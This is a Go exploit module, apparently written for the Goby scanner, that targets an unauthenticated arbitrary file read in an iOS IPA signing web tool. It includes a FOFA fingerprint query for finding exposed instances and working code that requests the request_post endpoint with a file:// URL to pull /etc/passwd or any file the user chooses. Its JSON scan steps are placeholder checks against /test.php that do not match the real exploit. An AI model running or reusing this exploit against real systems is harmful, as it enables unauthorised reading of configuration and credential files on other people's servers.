package exploits

import (
	"strings"
  "errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Apple's IPA signature tool /request_post  File Read Vulnerability",
    "Description": "<p>Apple's IPA signature tool on the IOS side, one-click signature APP clones can be opened, and you can sign and install apps that have not been put on the AppStore internal test. </p><p>Apple's IPA signing tool for IOS request_post has an arbitrary file reading vulnerability, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in extremely insecure websites.</p>",
    "Product": "Apple's IPA signature tool",
    "Homepage": "https://gitee.com/BiggerMax/superSign",
    "DisclosureDate": "2024-09-29",
    "PostTime": "2024-10-09",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": " body=\"/assets/index/css/mobileSelect.css\" && body=\"/assets/index/css/mobileSelect.js\"",
    "GobyQuery": " body=\"/assets/index/css/mobileSelect.css\" && body=\"/assets/index/css/mobileSelect.js\"",
    "Level": "1",
    "Impact": "<p>Apple's IPA signing tool for IOS request_post has an arbitrary file reading vulnerability, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in extremely insecure websites.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/142517625"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "苹果IOS端IPA签名工具 /request_post 文件读取漏洞",
            "Product": "苹果IOS端的IPA签名工具",
            "Description": "<p>苹果IOS端的IPA签名工具，一键签名APP分身多开，可签名安装未上架AppStore内测应用。<br></p><p>苹果IOS端IPA签名工具 request_post 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>苹果IOS端IPA签名工具 request_post 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Apple's IPA signature tool /request_post  File Read Vulnerability",
            "Product": "Apple's IPA signature tool",
            "Description": "<p>Apple's IPA signature tool on the IOS side, one-click signature APP clones can be opened, and you can sign and install apps that have not been put on the AppStore internal test.&nbsp;</p><p>Apple's IPA signing tool for IOS request_post has an arbitrary file reading vulnerability, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in extremely insecure websites.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Apple's IPA signing tool for IOS request_post has an arbitrary file reading vulnerability, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in extremely insecure websites.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`
postOrGet_ascjihayscgbyuasgftyucgyastgfcvyasbuycaskdasfasfasfassf := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
  respTxt := ""
  requestConfig := httpclient.NewGetRequestConfig("/api/index/request_post?url=file://"+fileUrl+"&post_data=1")
  requestConfig.VerifyTls = false
  requestConfig.FollowRedirect = false
  resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
  if err != nil || resp.StatusCode != 200 {
    err = errors.New("failed to read file")
    return "", err
  }
  respTxt = resp.RawBody
  // 注意：返回值为（最终要返回的读取结果，错误）
  return respTxt, nil
}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/api/index/request_post"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root:",
			}
			// 函数继承
			uploadFileFunc := postOrGet_ascjihayscgbyuasgftyucgyastgfcvyasbuycaskdasfasfasfassf

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root:"},
			}
			// 此处需要修改：函数继承
      uploadFileFunc := postOrGet_ascjihayscgbyuasgftyucgyastgfcvyasbuycaskdasfasfasfassf


			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}